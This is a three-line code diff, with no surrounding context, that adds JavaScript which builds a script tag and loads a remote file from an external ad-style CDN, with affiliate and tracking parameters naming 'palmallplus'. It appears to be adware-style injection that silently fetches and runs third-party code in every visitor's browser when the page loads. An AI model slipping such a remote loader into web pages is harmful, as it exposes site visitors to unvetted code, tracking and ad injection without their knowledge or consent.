@@ -1,0 +1,3 @@
+var e=document.createElement('script');
+e.src = '//cdn.visadd.com/script/14567725957/preload.js?subid=mm-1506&pr=palmallplus&um=palmallplus&umu=http%3A%2F%2Fabout.palmallplus.com%2Fabout%2FFlashMall%2FPRIVACY_POLICY';
+document.body.appendChild(e);
